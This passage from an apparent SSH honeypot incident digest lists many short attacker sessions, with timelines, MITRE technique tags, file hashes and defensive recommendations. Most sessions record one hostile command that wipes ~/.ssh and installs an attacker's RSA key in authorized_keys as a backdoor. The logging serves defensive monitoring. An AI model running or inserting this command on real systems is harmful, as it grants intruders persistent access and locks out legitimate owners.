| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 21:44:29` | `cowrie.session.connect` |
| `2026-05-24 21:44:29` | `cowrie.client.version` |
| `2026-05-24 21:44:29` | `cowrie.client.kex` |
| `2026-05-24 21:44:30` | `cowrie.login.success` |
| `2026-05-24 21:44:30` | `cowrie.session.params` |
| `2026-05-24 21:44:30` | `cowrie.command.input` |
| `2026-05-24 21:44:30` | `cowrie.command.failed` |
| `2026-05-24 21:44:31` | `cowrie.log.closed` |
| `2026-05-24 21:44:31` | `cowrie.session.params` |
| `2026-05-24 21:44:31` | `cowrie.command.input` |
| `2026-05-24 21:44:31` | `cowrie.session.file_download` |
| `2026-05-24 21:44:31` | `cowrie.log.closed` |
| `2026-05-24 21:44:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.104[.]31` to AbuseIPDB if not already reported
- [ ] Block `197.248.104[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6edb5c82e63

| Field | Detail |
|---|---|
| **Source IP** | `197.248.104[.]31` |
| **First Seen** | 2026-05-24 21:44 |
| **Last Seen** | 2026-05-24 21:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 21:44:34` | `cowrie.session.connect` |
| `2026-05-24 21:44:34` | `cowrie.client.version` |
| `2026-05-24 21:44:34` | `cowrie.client.kex` |
| `2026-05-24 21:44:35` | `cowrie.login.success` |
| `2026-05-24 21:44:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.104[.]31` to AbuseIPDB if not already reported
- [ ] Block `197.248.104[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8eb5e867e85

| Field | Detail |
|---|---|
| **Source IP** | `197.248.104[.]31` |
| **First Seen** | 2026-05-24 21:48 |
| **Last Seen** | 2026-05-24 21:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 21:48:42` | `cowrie.session.connect` |
| `2026-05-24 21:48:42` | `cowrie.client.version` |
| `2026-05-24 21:48:42` | `cowrie.client.kex` |
| `2026-05-24 21:48:43` | `cowrie.login.success` |
| `2026-05-24 21:48:43` | `cowrie.session.params` |
| `2026-05-24 21:48:43` | `cowrie.command.input` |
| `2026-05-24 21:48:43` | `cowrie.command.failed` |
| `2026-05-24 21:48:44` | `cowrie.log.closed` |
| `2026-05-24 21:48:44` | `cowrie.session.params` |
| `2026-05-24 21:48:44` | `cowrie.command.input` |
| `2026-05-24 21:48:44` | `cowrie.session.file_download` |
| `2026-05-24 21:48:44` | `cowrie.log.closed` |
| `2026-05-24 21:48:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.104[.]31` to AbuseIPDB if not already reported
- [ ] Block `197.248.104[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f964b9298db

| Field | Detail |
|---|---|
| **Source IP** | `197.248.104[.]31` |
| **First Seen** | 2026-05-24 21:48 |
| **Last Seen** | 2026-05-24 21:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 21:48:47` | `cowrie.session.connect` |
| `2026-05-24 21:48:47` | `cowrie.client.version` |
| `2026-05-24 21:48:47` | `cowrie.client.kex` |
| `2026-05-24 21:48:48` | `cowrie.login.success` |
| `2026-05-24 21:48:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.104[.]31` to AbuseIPDB if not already reported
- [ ] Block `197.248.104[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2620a83cddf

| Field | Detail |
|---|---|
| **Source IP** | `197.248.104[.]31` |
| **First Seen** | 2026-05-24 21:53 |
| **Last Seen** | 2026-05-24 21:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 21:53:00` | `cowrie.session.connect` |
| `2026-05-24 21:53:00` | `cowrie.client.version` |
| `2026-05-24 21:53:00` | `cowrie.client.kex` |
| `2026-05-24 21:53:01` | `cowrie.login.success` |
| `2026-05-24 21:53:02` | `cowrie.session.params` |
| `2026-05-24 21:53:02` | `cowrie.command.input` |
| `2026-05-24 21:53:02` | `cowrie.command.failed` |
| `2026-05-24 21:53:02` | `cowrie.log.closed` |
| `2026-05-24 21:53:02` | `cowrie.session.params` |
| `2026-05-24 21:53:02` | `cowrie.command.input` |
| `2026-05-24 21:53:02` | `cowrie.session.file_download` |
| `2026-05-24 21:53:02` | `cowrie.log.closed` |
| `2026-05-24 21:53:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.104[.]31` to AbuseIPDB if not already reported
- [ ] Block `197.248.104[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05f44e558be2

| Field | Detail |
|---|---|
| **Source IP** | `197.248.104[.]31` |
| **First Seen** | 2026-05-24 21:53 |
| **Last Seen** | 2026-05-24 21:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 21:53:05` | `cowrie.session.connect` |
| `2026-05-24 21:53:05` | `cowrie.client.version` |
| `2026-05-24 21:53:05` | `cowrie.client.kex` |
| `2026-05-24 21:53:06` | `cowrie.login.success` |
| `2026-05-24 21:53:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.104[.]31` to AbuseIPDB if not already reported
- [ ] Block `197.248.104[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec3c5ac532e8

| Field | Detail |
|---|---|
| **Source IP** | `35.225.56[.]202` |
| **First Seen** | 2026-05-24 21:53 |
| **Last Seen** | 2026-05-24 21:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 21:53:12` | `cowrie.session.connect` |
| `2026-05-24 21:53:12` | `cowrie.client.version` |
| `2026-05-24 21:53:12` | `cowrie.client.kex` |
| `2026-05-24 21:53:13` | `cowrie.login.success` |
| `2026-05-24 21:53:13` | `cowrie.session.params` |
| `2026-05-24 21:53:13` | `cowrie.command.input` |
| `2026-05-24 21:53:13` | `cowrie.command.failed` |
| `2026-05-24 21:53:14` | `cowrie.log.closed` |
| `2026-05-24 21:53:14` | `cowrie.session.params` |
| `2026-05-24 21:53:14` | `cowrie.command.input` |
| `2026-05-24 21:53:14` | `cowrie.session.file_download` |
| `2026-05-24 21:53:14` | `cowrie.log.closed` |
| `2026-05-24 21:53:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.225.56[.]202` to AbuseIPDB if not already reported
- [ ] Block `35.225.56[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2620a15e1af5

| Field | Detail |
|---|---|
| **Source IP** | `35.225.56[.]202` |
| **First Seen** | 2026-05-24 21:53 |
| **Last Seen** | 2026-05-24 21:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 21:53:17` | `cowrie.session.connect` |
| `2026-05-24 21:53:17` | `cowrie.client.version` |
| `2026-05-24 21:53:18` | `cowrie.client.kex` |
| `2026-05-24 21:53:19` | `cowrie.login.success` |
| `2026-05-24 21:53:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.225.56[.]202` to AbuseIPDB if not already reported
- [ ] Block `35.225.56[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-293d2c6ddf41

| Field | Detail |
|---|---|
| **Source IP** | `197.248.104[.]31` |
| **First Seen** | 2026-05-24 21:57 |
| **Last Seen** | 2026-05-24 21:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 21:57:10` | `cowrie.session.connect` |
| `2026-05-24 21:57:10` | `cowrie.client.version` |
| `2026-05-24 21:57:10` | `cowrie.client.kex` |
| `2026-05-24 21:57:11` | `cowrie.login.success` |
| `2026-05-24 21:57:11` | `cowrie.session.params` |
| `2026-05-24 21:57:11` | `cowrie.command.input` |
| `2026-05-24 21:57:11` | `cowrie.command.failed` |
| `2026-05-24 21:57:12` | `cowrie.log.closed` |
| `2026-05-24 21:57:12` | `cowrie.session.params` |
| `2026-05-24 21:57:12` | `cowrie.command.input` |
| `2026-05-24 21:57:12` | `cowrie.session.file_download` |
| `2026-05-24 21:57:12` | `cowrie.log.closed` |
| `2026-05-24 21:57:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.104[.]31` to AbuseIPDB if not already reported
- [ ] Block `197.248.104[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-578f400433a4

| Field | Detail |
|---|---|
| **Source IP** | `197.248.104[.]31` |
| **First Seen** | 2026-05-24 21:57 |
| **Last Seen** | 2026-05-24 21:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 21:57:15` | `cowrie.session.connect` |
| `2026-05-24 21:57:15` | `cowrie.client.version` |
| `2026-05-24 21:57:15` | `cowrie.client.kex` |
| `2026-05-24 21:57:16` | `cowrie.login.success` |
| `2026-05-24 21:57:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.104[.]31` to AbuseIPDB if not already reported
- [ ] Block `197.248.104[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec13270b0733

| Field | Detail |
|---|---|
| **Source IP** | `197.248.104[.]31` |
| **First Seen** | 2026-05-24 22:09 |
| **Last Seen** | 2026-05-24 22:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 22:09:45` | `cowrie.session.connect` |
| `2026-05-24 22:09:45` | `cowrie.client.version` |
| `2026-05-24 22:09:45` | `cowrie.client.kex` |
| `2026-05-24 22:09:46` | `cowrie.login.success` |
| `2026-05-24 22:09:46` | `cowrie.session.params` |
| `2026-05-24 22:09:46` | `cowrie.command.input` |
| `2026-05-24 22:09:46` | `cowrie.command.failed` |
| `2026-05-24 22:09:47` | `cowrie.log.closed` |
| `2026-05-24 22:09:47` | `cowrie.session.params` |
| `2026-05-24 22:09:47` | `cowrie.command.input` |
| `2026-05-24 22:09:47` | `cowrie.session.file_download` |
| `2026-05-24 22:09:47` | `cowrie.log.closed` |
| `2026-05-24 22:09:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.104[.]31` to AbuseIPDB if not already reported
- [ ] Block `197.248.104[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd1beb8af2a4

| Field | Detail |
|---|---|
| **Source IP** | `197.248.104[.]31` |
| **First Seen** | 2026-05-24 22:09 |
| **Last Seen** | 2026-05-24 22:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 22:09:50` | `cowrie.session.connect` |
| `2026-05-24 22:09:50` | `cowrie.client.version` |
| `2026-05-24 22:09:50` | `cowrie.client.kex` |
| `2026-05-24 22:09:51` | `cowrie.login.success` |
| `2026-05-24 22:09:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.104[.]31` to AbuseIPDB if not already reported
- [ ] Block `197.248.104[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12e4561273c7

| Field | Detail |
|---|---|
| **Source IP** | `197.248.104[.]31` |
| **First Seen** | 2026-05-24 22:13 |
| **Last Seen** | 2026-05-24 22:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 22:13:51` | `cowrie.session.connect` |
| `2026-05-24 22:13:51` | `cowrie.client.version` |
| `2026-05-24 22:13:51` | `cowrie.client.kex` |
| `2026-05-24 22:13:52` | `cowrie.login.success` |
| `2026-05-24 22:13:52` | `cowrie.session.params` |
| `2026-05-24 22:13:52` | `cowrie.command.input` |
| `2026-05-24 22:13:52` | `cowrie.command.failed` |
| `2026-05-24 22:13:53` | `cowrie.log.closed` |
| `2026-05-24 22:13:53` | `cowrie.session.params` |
| `2026-05-24 22:13:53` | `cowrie.command.input` |
| `2026-05-24 22:13:53` | `cowrie.session.file_download` |
| `2026-05-24 22:13:53` | `cowrie.log.closed` |
| `2026-05-24 22:13:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.104[.]31` to AbuseIPDB if not already reported
- [ ] Block `197.248.104[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ac44a284349

| Field | Detail |
|---|---|
| **Source IP** | `197.248.104[.]31` |
| **First Seen** | 2026-05-24 22:13 |
| **Last Seen** | 2026-05-24 22:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 22:13:56` | `cowrie.session.connect` |
| `2026-05-24 22:13:56` | `cowrie.client.version` |
| `2026-05-24 22:13:56` | `cowrie.client.kex` |
| `2026-05-24 22:13:57` | `cowrie.login.success` |
| `2026-05-24 22:13:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.104[.]31` to AbuseIPDB if not already reported
- [ ] Block `197.248.104[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6e9a027141d

| Field | Detail |
|---|---|
| **Source IP** | `45.173.103[.]146` |
| **First Seen** | 2026-05-24 22:26 |
| **Last Seen** | 2026-05-24 22:26 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 22:26:44` | `cowrie.session.connect` |
| `2026-05-24 22:26:44` | `cowrie.client.version` |
| `2026-05-24 22:26:44` | `cowrie.client.kex` |
| `2026-05-24 22:26:46` | `cowrie.login.success` |
| `2026-05-24 22:26:46` | `cowrie.session.params` |
| `2026-05-24 22:26:46` | `cowrie.command.input` |
| `2026-05-24 22:26:46` | `cowrie.command.failed` |
| `2026-05-24 22:26:47` | `cowrie.log.closed` |
| `2026-05-24 22:26:47` | `cowrie.session.params` |
| `2026-05-24 22:26:47` | `cowrie.command.input` |
| `2026-05-24 22:26:48` | `cowrie.session.file_download` |
| `2026-05-24 22:26:48` | `cowrie.log.closed` |
| `2026-05-24 22:26:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.173.103[.]146` to AbuseIPDB if not already reported
- [ ] Block `45.173.103[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eecdef980221

| Field | Detail |
|---|---|
| **Source IP** | `45.173.103[.]146` |
| **First Seen** | 2026-05-24 22:26 |
| **Last Seen** | 2026-05-24 22:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 22:26:51` | `cowrie.session.connect` |
| `2026-05-24 22:26:51` | `cowrie.client.version` |
| `2026-05-24 22:26:52` | `cowrie.client.kex` |
| `2026-05-24 22:26:53` | `cowrie.login.success` |
| `2026-05-24 22:26:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.173.103[.]146` to AbuseIPDB if not already reported
- [ ] Block `45.173.103[.]146` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b90a7b97cfad

| Field | Detail |
|---|---|
| **Source IP** | `14.103.34[.]252` |
| **First Seen** | 2026-05-24 22:30 |
| **Last Seen** | 2026-05-24 22:30 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 22:30:40` | `cowrie.session.connect` |
| `2026-05-24 22:30:40` | `cowrie.client.version` |
| `2026-05-24 22:30:40` | `cowrie.client.kex` |
| `2026-05-24 22:30:41` | `cowrie.login.success` |
| `2026-05-24 22:30:41` | `cowrie.session.params` |
| `2026-05-24 22:30:41` | `cowrie.command.input` |
